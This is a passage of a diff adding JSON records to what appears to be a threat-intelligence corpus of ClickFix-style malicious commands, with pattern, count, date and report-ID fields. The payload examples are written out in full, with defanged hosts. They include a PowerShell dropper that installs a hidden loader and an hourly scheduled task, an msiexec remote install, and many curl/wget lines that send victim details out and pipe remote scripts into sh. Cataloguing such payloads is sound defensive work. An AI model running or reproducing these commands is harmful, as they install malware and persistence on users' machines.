+      "Hex/obfuscated IP delivery: ...ntLoaded', startCallbackPolling); <!-- clickfix-observer-corpus --> IRM c\"d\"n[.]jsdelivr[.]net/g\"h\"/447349472638/0845D1a-D29D-43e2-AcD9-356Ea09250ec/d5-b17A-Ee4F8c9323af | IEX IRM c\"d\"n[.]jsdelivr[.]net/g\"h\"/447349472..."
+    ]
+  },
+  {
+    "Pattern": "Write-Host 'Verifying';$d=Join-Path $env:LOCALAPPDATA ([guid]::NewGuid().ToString('N').Substring(0,12));New-Item -ItemType Directory -Path $d -Force|Out-Null;$z=Join-Path $d 'bsdvaoqma0ilf.zip';$ok=$false;foreach($p in 0,10,25,40){Write-Host (\"Verifying... {0}%\" -f $p);Start-Sleep -Milliseconds 300};foreach($b in @('<URL>')){try{Invoke-WebRequest -UseBasicParsing -Uri $b -OutFile $z;if(Test-Path $z){$ok=$true;break}}catch{}};if($ok){foreach($p in 55,70){Write-Host (\"Verifying... {0}%\" -f $p);Start-Sleep -Milliseconds 300};Expand-Archive -LiteralPath $z -DestinationPath $d -Force;Remove-Item -LiteralPath $z -Force;$n=Join-Path $d 'npp_x\\notepad++.exe';$bp=Join-Path $d 'npp_boot.ps1';Set-Content -LiteralPath $bp -Value \"Set-Location '$d\\npp_x';`$pp=Get-Process -Name 'notepad++' -ErrorAction SilentlyContinue|Where-Object {`$_.Path -eq '$n'};if(-not `$pp){`$np=Start-Process -FilePath '$n' -ArgumentList '-multiInst' -WindowStyle Hidden -PassThru;try{Add-Type -TypeDefinition 'using System;using System.Runtime.InteropServices;public class ZW{[DllImport(`\"user32.dll`\")]public static extern bool EnumWindows(CB c,IntPtr l);public delegate bool CB(IntPtr h,IntPtr l);[DllImport(`\"user32.dll`\")]public static extern uint GetWindowThreadProcessId(IntPtr h,out uint p);[DllImport(`\"user32.dll`\")]public static extern bool ShowWindow(IntPtr h,int c);}';for(`$i=0;`$i -lt 60;`$i++){[ZW]::EnumWindows({param(`$h,`$l)`$q=[uint32]0;[void][ZW]::GetWindowThreadProcessId(`$h,[ref]`$q);if(`$q -eq `$np.Id){[void][ZW]::ShowWindow(`$h,0)};return `$true},[IntPtr]::Zero);Start-Sleep -Milliseconds 500}}catch{}}\";$tn=[guid]::NewGuid().ToString('N').Substring(0,16);& schtasks.exe /create /tn $tn /tr \"powershell.exe -w hidden -NoProfile -ExecutionPolicy Bypass -File `\"$bp`\"\" /sc HOURLY /mo 1 /f|Out-Null;foreach($p in 85,95,100){Write-Host (\"Verifying... {0}%\" -f $p);Start-Sleep -Milliseconds 300};Start-Process powershell.exe -ArgumentList \"-w hidden -NoProfile -ExecutionPolicy Bypass -File `\"$bp`\"\" -WindowStyle Hidden|Out-Null;Write-Host 'Verified'}else{Write-Host 'Verification failed';Remove-Item -Recurse -Force $d -ErrorAction SilentlyContinue};exit",
+    "DistinctPayloadCount": 1,
+    "ReportCount": 1,
+    "FirstSeen": "2026-11-11T12:04:55.126000+00:00",
+    "LastSeen": "2026-11-11T12:04:55.126000+00:00",
+    "ReportIds": [
+      "cmwc2nik9041h0omldfh5zlsu"
+    ],
+    "PayloadExamples": [
+      "Write-Host 'Verifying';$d=Join-Path $env:LOCALAPPDATA ([guid]::NewGuid().ToString('N').Substring(0,12));New-Item -ItemType Directory -Path $d -Force|Out-Null;$z=Join-Path $d 'bsdvaoqma0ilf.zip';$ok=$false;foreach($p in 0,10,25,40){Write-Host (\"Verifying... {0}%\" -f $p);Start-Sleep -Milliseconds 300};foreach($b in @('https://apidatalive[.]com/k/m255fDhVEvxs4mO9/collect?t=item&ti=4wpwLosTMSRrYNN4oQeDyIpm')){try{Invoke-WebRequest -UseBasicParsing -Uri $b -OutFile $z;if(Test-Path $z){$ok=$true;break}}catch{}};if($ok){foreach($p in 55,70){Write-Host (\"Verifying... {0}%\" -f $p);Start-Sleep -Milliseconds 300};Expand-Archive -LiteralPath $z -DestinationPath $d -Force;Remove-Item -LiteralPath $z -Force;$n=Join-Path $d 'npp_x\\notepad++.exe';$bp=Join-Path $d 'npp_boot.ps1';Set-Content -LiteralPath $bp -Value \"Set-Location '$d\\npp_x';`$pp=Get-Process -Name 'notepad++' -ErrorAction SilentlyContinue|Where-Object {`$_.Path -eq '$n'};if(-not `$pp){`$np=Start-Process -FilePath '$n' -ArgumentList '-multiInst' -WindowStyle Hidden -PassThru;try{Add-Type -TypeDefinition 'using System;using System.Runtime.InteropServices;public class ZW{[DllImport(`\"user32.dll`\")]public static extern bool EnumWindows(CB c,IntPtr l);public delegate bool CB(IntPtr h,IntPtr l);[DllImport(`\"user32.dll`\")]public static extern uint GetWindowThreadProcessId(IntPtr h,out uint p);[DllImport(`\"user32.dll`\")]public static extern bool ShowWindow(IntPtr h,int c);}';for(`$i=0;`$i -lt 60;`$i++){[ZW]::EnumWindows({param(`$h,`$l)`$q=[uint32]0;[void][ZW]::GetWindowThreadProcessId(`$h,[ref]`$q);if(`$q -eq `$np.Id){[void][ZW]::ShowWindow(`$h,0)};return `$true},[IntPtr]::Zero);Start-Sleep -Milliseconds 500}}catch{}}\";$tn=[guid]::NewGuid().ToString('N').Substring(0,16);& schtasks.exe /create /tn $tn /tr \"powershell.exe -w hidden -NoProfile -ExecutionPolicy Bypass -File `\"$bp`\"\" /sc HOURLY /mo 1 /f|Out-Null;foreach($p in 85,95,100){Write-Host (\"Verifying... {0}%\" -f $p);Start-Sleep -Milliseconds 300};Start-Process powershell.exe -ArgumentList \"-w hidden -NoProfile -ExecutionPolicy Bypass -File `\"$bp`\"\" -WindowStyle Hidden|Out-Null;Write-Host 'Verified'}else{Write-Host 'Verification failed';Remove-Item -Recurse -Force $d -ErrorAction SilentlyContinue};exit"
+    ]
+  },
+  {
+    "Pattern": "cmd /c \"curl -s -o NUL <URL> & msiexec /q /i <URL>\"",
+    "DistinctPayloadCount": 1,
+    "ReportCount": 1,
+    "FirstSeen": "2026-11-12T02:59:24.496000+00:00",
+    "LastSeen": "2026-11-12T02:59:24.496000+00:00",
+    "ReportIds": [
+      "cmwcylu3c0fav0oml4xhetl84"
+    ],
+    "PayloadExamples": [
+      "cmd /c \"curl -s -o NUL https://xedplay[.]com/verify.php?t=7fe13fa4dc9efc264de91e0508e89fb6 & msiexec /q /i https://distnode[.]biz/radar-cover-probe/named\""
+    ]
+  },
+  {
+    "Pattern": "cmd /c start /min cmd /c \"curl -sko %tmp%\\\\~u.cmd https:/",
+    "DistinctPayloadCount": 1,
+    "ReportCount": 1,
+    "FirstSeen": "2026-11-09T08:47:09.758000+00:00",
+    "LastSeen": "2026-11-09T08:47:09.758000+00:00",
+    "ReportIds": [
+      "cmw90phw62gp50omlrleqr8gj"
+    ],
+    "PayloadExamples": [
+      "cmd /c start /min cmd /c \"curl -sko %tmp%\\\\~u.cmd https:/"
+    ]
+  },
+  {
+    "Pattern": "curl -sL -d \"id=0048088b-86c5-4092-8adf-ae27e12f8b11&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Fcompany-hamza-abbs.com%2F&os=Linux%20x86_64&lastVisitAt=2026-11-11T14%3A45%3A29.831Z&lastShellAt=2026-11-11T14%3A45%3A29.831Z\" \"<URL>\" && wget -qO- '<URL>' -L | sh",
+    "DistinctPayloadCount": 1,
+    "ReportCount": 1,
+    "FirstSeen": "2026-11-11T14:47:25.243000+00:00",
+    "LastSeen": "2026-11-11T14:47:25.243000+00:00",
+    "ReportIds": [
+      "cmwc8ghte05n20omlrpl5slpy"
+    ],
+    "PayloadExamples": [
+      "curl -sL -d \"id=0048088b-86c5-4092-8adf-ae27e12f8b11&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Fcompany-hamza-abbs[.]com%2F&os=Linux%20x86_64&lastVisitAt=2026-11-11T14%3A45%3A29.831Z&lastShellAt=2026-11-11T14%3A45%3A29.831Z\" \"https://script[.]google[.]com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec\" && wget -qO- 'https://script-six-tawny[.]vercel[.]app/lin' -L | sh"
+    ]
+  },
+  {
+    "Pattern": "curl -sL -d \"id=00dcc813-bf10-4981-811a-b33bb554bee6&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Famplifiedstrings.com%2F&os=Linux%20x86_64&lastVisitAt=2026-11-11T12%3A04%3A08.183Z&lastShellAt=2026-11-11T12%3A04%3A08.183Z\" \"<URL>\" && wget -qO- '<URL>' -L | sh",
+    "DistinctPayloadCount": 1,
+    "ReportCount": 1,
+    "FirstSeen": "2026-11-11T12:05:30.932000+00:00",
+    "LastSeen": "2026-11-11T12:05:30.932000+00:00",
+    "ReportIds": [
+      "cmwc2oa6f042g0omlyp6s24eo"
+    ],
+    "PayloadExamples": [
+      "curl -sL -d \"id=00dcc813-bf10-4981-811a-b33bb554bee6&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Famplifiedstrings[.]com%2F&os=Linux%20x86_64&lastVisitAt=2026-11-11T12%3A04%3A08.183Z&lastShellAt=2026-11-11T12%3A04%3A08.183Z\" \"https://script[.]google[.]com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec\" && wget -qO- 'https://script-six-tawny[.]vercel[.]app/lin' -L | sh"
+    ]
+  },
+  {
+    "Pattern": "curl -sL -d \"id=077c70e0-cd50-430b-8669-85e85fa0ebf0&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Fblancoybrasil.com%2F&os=Linux%20x86_64&lastVisitAt=2026-11-12T05%3A54%3A59.593Z&lastShellAt=2026-11-12T05%3A54%3A59.593Z\" \"<URL>\" && wget -qO- '<URL>' -L | sh",
+    "DistinctPayloadCount": 1,
+    "ReportCount": 1,
+    "FirstSeen": "2026-11-12T05:56:25.067000+00:00",
+    "LastSeen": "2026-11-12T05:56:25.067000+00:00",
+    "ReportIds": [
+      "cmwd4xgzr00qh0oml10gmmayh"
+    ],
+    "PayloadExamples": [
+      "curl -sL -d \"id=077c70e0-cd50-430b-8669-85e85fa0ebf0&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Fblancoybrasil[.]com%2F&os=Linux%20x86_64&lastVisitAt=2026-11-12T05%3A54%3A59.593Z&lastShellAt=2026-11-12T05%3A54%3A59.593Z\" \"https://script[.]google[.]com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec\" && wget -qO- 'https://script-six-tawny[.]vercel[.]app/lin' -L | sh"
+    ]
+  },
+  {
+    "Pattern": "curl -sL -d \"id=0d13442a-4f8e-48da-8893-7cf782cc75d9&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Fbienestarozempic.com%2F&os=Linux%20x86_64&lastVisitAt=2026-11-11T12%3A37%3A12.096Z&lastShellAt=2026-11-11T12%3A37%3A12.096Z\" \"<URL>\" && wget -qO- '<URL>' -L | sh",
+    "DistinctPayloadCount": 1,
+    "ReportCount": 1,
+    "FirstSeen": "2026-11-11T12:38:33.514000+00:00",
+    "LastSeen": "2026-11-11T12:38:33.514000+00:00",
+    "ReportIds": [
+      "cmwc3urxe04kd0omlim6ckocw"
+    ],
+    "PayloadExamples": [
+      "curl -sL -d \"id=0d13442a-4f8e-48da-8893-7cf782cc75d9&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Fbienestarozempic[.]com%2F&os=Linux%20x86_64&lastVisitAt=2026-11-11T12%3A37%3A12.096Z&lastShellAt=2026-11-11T12%3A37%3A12.096Z\" \"https://script[.]google[.]com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec\" && wget -qO- 'https://script-six-tawny[.]vercel[.]app/lin' -L | sh"
+    ]
+  },
+  {
+    "Pattern": "curl -sL -d \"id=1ba468db-fb84-4201-9b02-7eafec91aaf8&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2F9thstreetycc.org%2F&os=Linux%20x86_64&lastVisitAt=2026-11-10T21%3A38%3A45.867Z&lastShellAt=2026-11-10T21%3A38%3A45.867Z\" \"<URL>\" && wget -qO- '<URL>' -L | sh",
+    "DistinctPayloadCount": 1,
+    "ReportCount": 1,
+    "FirstSeen": "2026-11-10T21:40:09.253000+00:00",
+    "LastSeen": "2026-11-10T21:40:09.253000+00:00",
+    "ReportIds": [
+      "cmwb7rf82021p0nmli0ofq41p"
+    ],
+    "PayloadExamples": [
+      "curl -sL -d \"id=1ba468db-fb84-4201-9b02-7eafec91aaf8&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2F9thstreetycc[.]org%2F&os=Linux%20x86_64&lastVisitAt=2026-11-10T21%3A38%3A45.867Z&lastShellAt=2026-11-10T21%3A38%3A45.867Z\" \"https://script[.]google[.]com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec\" && wget -qO- 'https://script-six-tawny[.]vercel[.]app/lin' -L | sh"
+    ]
+  },
+  {
+    "Pattern": "curl -sL -d \"id=21a93fe7-8de4-49ec-bc9a-e8158d30427a&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Fsouthwestsocialservicesinc.com%2F&os=Linux%20x86_64&lastVisitAt=2026-11-09T09%3A00%3A45.004Z&lastShellAt=2026-11-09T09%3A00%3A45.004Z\" \"<URL>\" && wget -qO- '<URL>' -L | sh",
+    "DistinctPayloadCount": 1,
+    "ReportCount": 1,
+    "FirstSeen": "2026-11-09T09:02:46.088000+00:00",
+    "LastSeen": "2026-11-09T09:02:46.088000+00:00",
+    "ReportIds": [
+      "cmw919kau2hq20omlin08m3ae"
+    ],
+    "PayloadExamples": [
+      "curl -sL -d \"id=21a93fe7-8de4-49ec-bc9a-e8158d30427a&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Fsouthwestsocialservicesinc[.]com%2F&os=Linux%20x86_64&lastVisitAt=2026-11-09T09%3A00%3A45.004Z&lastShellAt=2026-11-09T09%3A00%3A45.004Z\" \"https://script[.]google[.]com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec\" && wget -qO- 'https://script-six-tawny[.]vercel[.]app/lin' -L | sh"
+    ]
+  },
+  {
+    "Pattern": "curl -sL -d \"id=3ec21352-bff8-4e95-9cf4-6287e383ca91&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Falkhaleej-shopping.com%2F&os=Linux%20x86_64&lastVisitAt=2026-11-11T11%3A59%3A16.381Z&lastShellAt=2026-11-11T11%3A59%3A16.381Z\" \"<URL>\" && wget -qO- '<URL>' -L | sh",
+    "DistinctPayloadCount": 1,
+    "ReportCount": 1,
+    "FirstSeen": "2026-11-11T12:00:39.974000+00:00",
+    "LastSeen": "2026-11-11T12:00:39.974000+00:00",
+    "ReportIds": [
+      "cmwc2i1nf03y30oml2lrh8mr8"
+    ],
+    "PayloadExamples": [
+      "curl -sL -d \"id=3ec21352-bff8-4e95-9cf4-6287e383ca91&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Falkhaleej-shopping[.]com%2F&os=Linux%20x86_64&lastVisitAt=2026-11-11T11%3A59%3A16.381Z&lastShellAt=2026-11-11T11%3A59%3A16.381Z\" \"https://script[.]google[.]com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec\" && wget -qO- 'https://script-six-tawny[.]vercel[.]app/lin' -L | sh"
+    ]
+  },
+  {
+    "Pattern": "curl -sL -d \"id=4f7a58c8-8e19-4964-b255-4d277312ae80&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Fghanawebdirectory.com%2F&os=Linux%20x86_64&lastVisitAt=2026-11-09T09%3A34%3A02.296Z&lastShellAt=2026-11-09T09%3A34%3A02.296Z\" \"<URL>\" && wget -qO- '<URL>' -L | sh",
+    "DistinctPayloadCount": 1,
+    "ReportCount": 1,
+    "FirstSeen": "2026-11-09T09:36:03.887000+00:00",
+    "LastSeen": "2026-11-09T09:36:03.887000+00:00",
+    "ReportIds": [
+      "cmw92gdsu2i5y0omlbhso6vbf"
+    ],
+    "PayloadExamples": [
+      "curl -sL -d \"id=4f7a58c8-8e19-4964-b255-4d277312ae80&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Fghanawebdirectory[.]com%2F&os=Linux%20x86_64&lastVisitAt=2026-11-09T09%3A34%3A02.296Z&lastShellAt=2026-11-09T09%3A34%3A02.296Z\" \"https://script[.]google[.]com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec\" && wget -qO- 'https://script-six-tawny[.]vercel[.]app/lin' -L | sh"
+    ]
+  },
+  {
+    "Pattern": "curl -sL -d \"id=55b9976e-6d4b-4b49-bb84-a5d7a49ad6de&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Fbomwin22.com%2F&os=Linux%20x86_64&lastVisitAt=2026-11-11T09%3A51%3A58.053Z&lastShellAt=2026-11-11T09%3A51%3A58.053Z\" \"<URL>\" && wget -qO- '<URL>' -L | sh",
+    "DistinctPayloadCount": 1,
+    "ReportCount": 1,
+    "FirstSeen": "2026-11-11T09:53:22.670000+00:00",
+    "LastSeen": "2026-11-11T09:53:22.670000+00:00",
+    "ReportIds": [
+      "cmwbxycow02du0omlmyorrq8u"
+    ],
+    "PayloadExamples": [
+      "curl -sL -d \"id=55b9976e-6d4b-4b49-bb84-a5d7a49ad6de&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Fbomwin22[.]com%2F&os=Linux%20x86_64&lastVisitAt=2026-11-11T09%3A51%3A58.053Z&lastShellAt=2026-11-11T09%3A51%3A58.053Z\" \"https://script[.]google[.]com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec\" && wget -qO- 'https://script-six-tawny[.]vercel[.]app/lin' -L | sh"
+    ]
+  },
+  {
+    "Pattern": "curl -sL -d \"id=7e8fc7bb-c8b4-475a-aa0d-a0eee8b55a1a&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Falloyspectrum.com%2F&os=Linux%20x86_64&lastVisitAt=2026-11-11T09%3A37%3A11.462Z&lastShellAt=2026-11-11T09%3A37%3A11.462Z\" \"<URL>\" && wget -qO- '<URL>' -L | sh",
+    "DistinctPayloadCount": 1,
+    "ReportCount": 1,
+    "FirstSeen": "2026-11-11T09:38:34.916000+00:00",
+    "LastSeen": "2026-11-11T09:38:34.916000+00:00",
+    "ReportIds": [
+      "cmwbxfbop01t80omlciyjaavv"
+    ],
+    "PayloadExamples": [
+      "curl -sL -d \"id=7e8fc7bb-c8b4-475a-aa0d-a0eee8b55a1a&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Falloyspectrum[.]com%2F&os=Linux%20x86_64&lastVisitAt=2026-11-11T09%3A37%3A11.462Z&lastShellAt=2026-11-11T09%3A37%3A11.462Z\" \"https://script[.]google[.]com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec\" && wget -qO- 'https://script-six-tawny[.]vercel[.]app/lin' -L | sh"
+    ]
+  },
+  {
+    "Pattern": "curl -sL -d \"id=8210ad04-beab-4e13-8c15-48d31c63313f&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Fmehedi3937.infinityfreeapp.com%2F%3Fi%3D1&os=Linux%20x86_64&lastVisitAt=2026-11-11T02%3A35%3A49.557Z&lastShellAt=2026-11-11T02%3A35%3A49.557Z\" \"<URL>\" && curl -fsSL \"<URL>\" | sh",
+    "DistinctPayloadCount": 1,
+    "ReportCount": 1,
+    "FirstSeen": "2026-11-11T02:37:12.276000+00:00",
+    "LastSeen": "2026-11-11T02:37:12.276000+00:00",
+    "ReportIds": [
+      "cmwbidflq07sb0nml927bheu2"
+    ],
+    "PayloadExamples": [
+      "curl -sL -d \"id=8210ad04-beab-4e13-8c15-48d31c63313f&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Fmehedi3937[.]infinityfreeapp[.]com%2F%3Fi%3D1&os=Linux%20x86_64&lastVisitAt=2026-11-11T02%3A35%3A49.557Z&lastShellAt=2026-11-11T02%3A35%3A49.557Z\" \"https://script[.]google[.]com/macros/s/AKfycbwR4W_Fm4dL82LZC49P_G58-W06_Z_TMez_MEHLaklDe_nTe5wlqlWBsD02XGR-KYIX3A/exec\" && curl -fsSL \"https://softify[.]lat/u/8ecec3ba\" | sh"
+    ]
+  },
+  {
+    "Pattern": "curl -sL -d \"id=8217a4bd-5db0-493f-a59c-d634628d1d28&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Fmonadnockdevelopment.com%2F&os=Linux%20x86_64&lastVisitAt=2026-11-10T21%3A09%3A13.413Z&lastShellAt=2026-11-10T21%3A09%3A13.413Z\" \"<URL>\" && wget -qO- '<URL>' -L | sh",
+    "DistinctPayloadCount": 1,
+    "ReportCount": 1,
+    "FirstSeen": "2026-11-10T21:10:36.912000+00:00",
+    "LastSeen": "2026-11-10T21:10:36.912000+00:00",
+    "ReportIds": [
+      "cmwb6pfm0018w0nmlotuah88g"
+    ],
+    "PayloadExamples": [
+      "curl -sL -d \"id=8217a4bd-5db0-493f-a59c-d634628d1d28&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Fmonadnockdevelopment[.]com%2F&os=Linux%20x86_64&lastVisitAt=2026-11-10T21%3A09%3A13.413Z&lastShellAt=2026-11-10T21%3A09%3A13.413Z\" \"https://script[.]google[.]com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec\" && wget -qO- 'https://script-six-tawny[.]vercel[.]app/lin' -L | sh"
+    ]
+  },
+  {
+    "Pattern": "curl -sL -d \"id=851a2189-cf51-42eb-bb25-0aca6fff4673&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Fdiazlawncareandmaintenance.com%2F&os=Linux%20x86_64&lastVisitAt=2026-11-09T08%3A59%3A37.231Z&lastShellAt=2026-11-09T08%3A59%3A37.231Z\" \"<URL>\" && wget -qO- '<URL>' -L | sh",
+    "DistinctPayloadCount": 1,
+    "ReportCount": 1,
+    "FirstSeen": "2026-11-09T09:01:40.149000+00:00",
+    "LastSeen": "2026-11-09T09:01:40.149000+00:00",
+    "ReportIds": [
+      "cmw9185ff2hpc0oml2t2gkjiq"
+    ],
+    "PayloadExamples": [
+      "curl -sL -d \"id=851a2189-cf51-42eb-bb25-0aca6fff4673&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Fdiazlawncareandmaintenance[.]com%2F&os=Linux%20x86_64&lastVisitAt=2026-11-09T08%3A59%3A37.231Z&lastShellAt=2026-11-09T08%3A59%3A37.231Z\" \"https://script[.]google[.]com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec\" && wget -qO- 'https://script-six-tawny[.]vercel[.]app/lin' -L | sh"
+    ]
+  },
+  {
+    "Pattern": "curl -sL -d \"id=9e9e05df-8123-447c-87d9-7704081b893a&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Fcollagenglowc.com%2F&os=Linux%20x86_64&lastVisitAt=2026-11-11T12%3A01%3A46.841Z&lastShellAt=2026-11-11T12%3A01%3A46.841Z\" \"<URL>\" && wget -qO- '<URL>' -L | sh",
+    "DistinctPayloadCount": 1,
+    "ReportCount": 1,
+    "FirstSeen": "2026-11-11T12:03:08.416000+00:00",
+    "LastSeen": "2026-11-11T12:03:08.416000+00:00",
+    "ReportIds": [
+      "cmwc2l882040h0omlxbkj9ffw"
+    ],
+    "PayloadExamples": [
+      "curl -sL -d \"id=9e9e05df-8123-447c-87d9-7704081b893a&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Fcollagenglowc[.]com%2F&os=Linux%20x86_64&lastVisitAt=2026-11-11T12%3A01%3A46.841Z&lastShellAt=2026-11-11T12%3A01%3A46.841Z\" \"https://script[.]google[.]com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec\" && wget -qO- 'https://script-six-tawny[.]vercel[.]app/lin' -L | sh"
+    ]
+  },
+  {
+    "Pattern": "curl -sL -d \"id=a0a866b2-7d0f-4965-a279-7ea3cee721e1&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Fexperimentfives.com%2F&os=Linux%20x86_64&lastVisitAt=2026-11-10T21%3A41%3A43.628Z&lastShellAt=2026-11-10T21%3A41%3A43.628Z\" \"<URL>\" && wget -qO- '<URL>' -L | sh",
+    "DistinctPayloadCount": 1,
+    "ReportCount": 1,
+    "FirstSeen": "2026-11-10T21:43:05.746000+00:00",
+    "LastSeen": "2026-11-10T21:43:05.746000+00:00",
+    "ReportIds": [
+      "cmwb7v7i1025t0nml5t0xcclk"
+    ],
+    "PayloadExamples": [
+      "curl -sL -d \"id=a0a866b2-7d0f-4965-a279-7ea3cee721e1&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Fexperimentfives[.]com%2F&os=Linux%20x86_64&lastVisitAt=2026-11-10T21%3A41%3A43.628Z&lastShellAt=2026-11-10T21%3A41%3A43.628Z\" \"https://script[.]google[.]com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec\" && wget -qO- 'https://script-six-tawny[.]vercel[.]app/lin' -L | sh"
+    ]
+  },
+  {
+    "Pattern": "curl -sL -d \"id=a63b59e2-3190-4cd7-a9fb-b9603df4767c&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Fsoloflightdesign.com%2F&os=Linux%20x86_64&lastVisitAt=2026-11-13T09%3A26%3A58.006Z&lastShellAt=2026-11-13T09%3A26%3A58.006Z\" \"<URL>\" && wget -qO- '<URL>' -L | sh",
+    "DistinctPayloadCount": 1,
+    "ReportCount": 1,
+    "FirstSeen": "2026-11-13T09:28:22.206000+00:00",
+    "LastSeen": "2026-11-13T09:28:22.206000+00:00",
+    "ReportIds": [
+      "cmwerxwap0e0d0omlo90ozon6"
+    ],
+    "PayloadExamples": [
+      "curl -sL -d \"id=a63b59e2-3190-4cd7-a9fb-b9603df4767c&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Fsoloflightdesign[.]com%2F&os=Linux%20x86_64&lastVisitAt=2026-11-13T09%3A26%3A58.006Z&lastShellAt=2026-11-13T09%3A26%3A58.006Z\" \"https://script[.]google[.]com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec\" && wget -qO- 'https://script-six-tawny[.]vercel[.]app/lin' -L | sh"
+    ]
+  },
+  {
+    "Pattern": "curl -sL -d \"id=b42e28fe-dd52-48e2-9652-bad29e07cf1d&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Felegantinteriors.com.pk%2F&os=Linux%20x86_64&lastVisitAt=2026-11-11T16%3A55%3A26.377Z&lastShellAt=2026-11-11T16%3A55%3A26.377Z\" \"<URL>\" && wget -qO- '<URL>' -L | sh",
+    "DistinctPayloadCount": 1,
+    "ReportCount": 1,
+    "FirstSeen": "2026-11-11T16:56:48.024000+00:00",
+    "LastSeen": "2026-11-11T16:56:48.024000+00:00",
+    "ReportIds": [
+      "cmwcd2vl707b60omlre2bbg8k"
+    ],
+    "PayloadExamples": [
+      "curl -sL -d \"id=b42e28fe-dd52-48e2-9652-bad29e07cf1d&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Felegantinteriors.com.pk%2F&os=Linux%20x86_64&lastVisitAt=2026-11-11T16%3A55%3A26.377Z&lastShellAt=2026-11-11T16%3A55%3A26.377Z\" \"https://script[.]google[.]com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec\" && wget -qO- 'https://script-six-tawny[.]vercel[.]app/lin' -L | sh"
+    ]
+  },
+  {
+    "Pattern": "curl -sL -d \"id=c904d3d4-0134-4538-962a-87f6cc0e2b25&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Fwww.balancedarch.ca%2F&os=Linux%20x86_64&lastVisitAt=2026-11-11T12%3A38%3A58.204Z&lastShellAt=2026-11-11T12%3A38%3A58.204Z\" \"<URL>\" && wget -qO- '<URL>' -L | sh",
+    "DistinctPayloadCount": 1,
+    "ReportCount": 1,
